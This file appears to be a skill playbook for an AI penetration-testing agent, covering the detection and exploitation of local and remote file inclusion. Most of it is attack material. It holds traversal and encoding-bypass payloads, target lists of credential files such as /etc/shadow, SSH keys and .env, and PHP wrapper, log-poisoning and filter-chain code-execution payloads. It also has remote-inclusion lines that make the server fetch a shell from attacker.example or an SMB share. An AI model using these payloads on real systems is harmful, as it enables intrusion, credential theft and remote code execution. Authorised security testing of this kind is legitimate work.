---
name: file-inclusion
description: Detect and exploit local and remote file inclusion vulnerabilities for sensitive data access and code execution
origin: Vigil
vuln_class: lfi, rfi, path-traversal, img-traversal
---

# File Inclusion Testing

> **`vigil assess kali` audit flags:** use `--technique LFI` for local-file inclusion (`/etc/passwd`, PHP filter wrappers, log poisoning). Switch to `RFI` when the payload fetches a remote URL the server loads.

## When to Activate

- Parameter references file paths: `page=`, `file=`, `template=`, `include=`, `path=`, `doc=`, `lang=`
- Dynamic content loading based on user input, URL patterns like `/index.php?page=about`
- Error messages reveal file system paths

## Tools

- `vigil assess kali exec -- curl ...` (manual path traversal probing and wrapper testing — all target-facing curl must go through the kali exec wrapper; use `--technique LFI --probe-kind payload --phase consume-test --timeout 30` for LFI attempts, `--technique RFI` for remote-file inclusion)
- `vigil assess kali ffuf ...` (automated traversal depth and path fuzzing — use `--technique LFI --probe-kind payload --phase consume-test --timeout 600`)
- `vigil assess classify-payload <value> --mutations` (type the `page=`/`file=` value and generate traversal/encoding variants — see "Type the Inclusion Parameter" below)
- `vigil assess anomaly-score <responses.jsonl>` (triage a traversal-depth fuzz sweep — rank the response population to find the depth that read the file; see "Triaging the Depth Sweep" below)
- `vigil oob mint` / `vigil oob poll` (RFI only — `mint` binds the nonce under a running client's interactsh id so `poll` can correlate it; pass `--client <name>` when several clients run; point the inclusion at the EXACT host mint prints (`$OOB_HOST`), poll for the server-side fetch; see "Remote File Inclusion" below)
- `php_filter_chain_generator.py` — PHP filter chain RCE without file write (synacktiv tool — run host-side to generate payloads, then deliver via kali exec)

## Methodology

### 1. LFI Detection

### Basic Path Traversal
```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?file=..%2f..%2f..%2fetc/passwd
?page=/etc/passwd
?page=..\..\..\..\windows\win.ini
?page=C:\windows\win.ini
```

### Filter Bypass Techniques
```
# Double encoding
?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
# Null byte (PHP < 5.3.4)
?page=../../../etc/passwd%00
# Dot-dot-slash variations
?page=....//....//....//etc/passwd
?page=..;/..;/..;/etc/passwd       # Tomcat/Java
?page=..%c0%af..%c0%afetc/passwd   # Overlong UTF-8
?page=..%ef%bc%8f..%ef%bc%8fetc/passwd  # Unicode fullwidth slash
# Path truncation (PHP < 5.3, 4096+ chars)
?page=../../../etc/passwd/./././././[...repeat...]
# Extension bypass
?page=php://filter/convert.base64-encode/resource=index  # reads index.php
?page=../../../etc/passwd%00.php
```

### Type the Inclusion Parameter

Before hand-typing the traversal and encoding permutations above, classify the value the parameter currently carries (e.g. the default `page=about` or `file=report.pdf`) and let the oracle generate path-aware variants deterministically:

```bash
vigil assess classify-payload "../uploads/report.pdf" --mutations   # type: path
vigil assess classify-payload "/var/www/page.php" --mutations       # type: path
```

Consume by intent bucket:

- **`escalation`** — for a `path` value this yields `../../etc/passwd`, `../../../etc/shadow`, `/etc/passwd`, `/admin`, `/internal` (and, past the default 5-cap, the `%2F`-encoded traversal of the original and `value/..` — pass `--max-per-intent 7` to surface them). These are your first-pass traversal candidates.
- **`format`** — yields the Windows-style `\`-separated form and the `%2F`-encoded form (the parser-confusion bypasses for filters that only match literal `../`).
- **`boundary`** — `/`, `.`, `/etc/passwd`, `/proc/self/environ` probe how the include handler reacts to degenerate and well-known absolute paths.

Each variant is a literal string for the parameter slot — deliver via the kali exec wrapper. This seeds the candidate list; the deeper traversal depths, null-byte, and overlong-UTF-8 variants still come from the directory-traversal payload reference (those are encoding families, not single typed values).

### Triaging the Depth Sweep

A traversal sweep walks `../`, `../../`, `../../../` … until one depth resolves to the target file — but a `ffuf`/curl batch returns dozens of near-identical 200s (the app's default page) plus the one hit (the file contents, a different size). Instead of eyeballing lengths, capture each response as a record and rank:

```bash
# one JSONL line per depth: {"url":"?page=../../../etc/passwd","status":200,"content_length":2841,"words":31,"lines":44}
vigil assess anomaly-score depth_sweep.jsonl --top 5
```

The depth that actually read `/etc/passwd` diverges from the default-page population on `length_bucket`, `words_bucket`, and `lines_bucket` — the oracle ranks it first and annotates which attribute flipped. Investigate the top outlier; confirm it is the file (look for `root:x:0:0:` in that response), not an error page of a different size. A flat ranking means no depth resolved the file: increase depth, switch encoding (the `format` variants above), or the parameter is not a filesystem include. This is the same triage pass for the `ffuf` output — pipe its results in rather than scrolling the match list.

## Sensitive Files

### Linux
```
/etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ, /proc/self/cmdline
/proc/self/fd/0-20, /proc/net/tcp, /home/USER/.ssh/id_rsa
/var/log/auth.log, /var/log/apache2/access.log, /var/log/nginx/access.log
```

### Web App Files
```
/etc/apache2/sites-enabled/000-default.conf, /etc/nginx/sites-enabled/default
/var/www/html/index.php, /var/www/html/config.php, /var/www/html/.env
/var/www/html/wp-config.php, .env, config.php, config.yml, database.yml, settings.py
```

### Windows
```
C:\windows\win.ini, C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config, C:\xampp\apache\conf\httpd.conf
```

## PHP Wrappers

### php://filter — Read Source Code
```
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/convert.base64-encode/resource=config
echo "BASE64_OUTPUT" | base64 -d
```

### php://input — Code Execution (requires allow_url_include=On)
```bash
curl -X POST "http://target/index.php?page=php://input" --data "PAYLOAD: php system('id')"
```

### data:// — Code Execution (requires allow_url_include=On)
```
?page=data://text/plain,PAYLOAD: php system('id')
?page=data://text/plain;base64,BASE64_ENCODED_PHP_SYSTEM_CALL
```

### expect:// (rare, requires expect extension)
```
?page=expect://id
```

### zip:// and phar:// — Via File Upload
```
echo 'PAYLOAD: php system($_GET["cmd"])' > shell.php && zip shell.zip shell.php
?page=zip://uploads/shell.zip%23shell.php
?page=phar://uploads/shell.phar/shell.php
```

## LFI to RCE

### Log Poisoning
```bash
# Inject PHP into access log via User-Agent
curl -A "PAYLOAD: php system($_GET['cmd'])" http://target/
# Include the log file
?page=../../../var/log/apache2/access.log&cmd=id
# Alt: SSH log injection
ssh "PAYLOAD: php system($_GET['cmd'])"@target
?page=../../../var/log/auth.log&cmd=id
```

### /proc/self/environ
```
curl -A "PAYLOAD: php system('id')" "http://target/?page=../../../proc/self/environ"
```

### Session File Inclusion
```
# Session files at: /var/lib/php/sessions/sess_ID or /tmp/sess_ID
# Set session var containing PHP code, then include session file
?page=../../../var/lib/php/sessions/sess_YOUR_SESSION_ID
```

### PHP Filter Chain (No File Write)
```
python3 php_filter_chain_generator.py --chain 'PAYLOAD: php system("id")'
# Use output as inclusion parameter value
```

## Remote File Inclusion (requires allow_url_include=On)

Before serving a shell, confirm the server actually fetches an attacker URL — mint a nonce-tagged callback, point the parameter at it, and poll. The callback fires on the server-side fetch even when the response body does not reflect the included content (blind RFI / SSRF-via-include):

```bash
vigil oob status --json
vigil oob mint --client <name> --technique rfi --target-url "https://target/index.php" --param page --probe-kind http
# → host  <prefix>-<token>.<client-id>.oob.example.com   (= $OOB_HOST)
```

Point the inclusion at the EXACT host mint prints (`$OOB_HOST` — the nonce bound under the client id; never hand-build a bare `<nonce>.oob...` host):

```
?page=http://$OOB_HOST/      # confirm server-side fetch (blind RFI / include-SSRF)
?page=http://attacker.example/shell.txt    # shell.txt: PAYLOAD: php system($_GET['cmd'])
?page=http://attacker.example/shell.txt%00 # null byte to strip appended extension
?page=\\$OOB_HOST\share\x   # SMB (Windows) — UNC fetch fires the callback even when allow_url_include is Off
?page=\\attacker.example\share\shell.php   # SMB (Windows, no allow_url_include needed)
```

Correlate the fetch instead of grepping the listener log:

```bash
vigil oob poll --client <name> --json
```

A non-empty `matched` array for your nonce proves the server dereferenced your URL — `allow_url_include` is On (or the SMB/UNC path was followed). That confirms RFI/include-SSRF reach before you invest in hosting and delivering a shell payload. Empty `matched` → `allow_url_include` is Off and no UNC fetch happened; stay on the LFI path.

## What to Record

- Vulnerable parameter and endpoint
- Traversal depth required (how many `../`)
- Encoding/bypass technique needed (null byte, double encoding, etc.)
- Files successfully read and their content — confirming `/etc/passwd` is readable only starts the finding; prove the attacker outcome (`agent/rules/hunting.md` §2), e.g., the `/etc/shadow` file was read and contains hashed credentials for 5 accounts, the `.env` file disclosed database password that authenticated against the production MySQL instance, log poisoning via User-Agent injection achieved RCE confirmed with `id` output showing `uid=33(www-data)`
- RCE method if achieved (log poisoning, PHP wrappers, filter chains)
- Severity: Critical (RCE), High (sensitive file read), Medium (limited file read)

## Extended Resources

- `agent/references/payloads/file-inclusion-payloads.md` — path traversal, PHP wrappers, null byte, log poisoning, interesting files
- `agent/references/payloads/directory-traversal-payloads.md` — encoding variants, null byte, double URL encoding, OS-specific paths
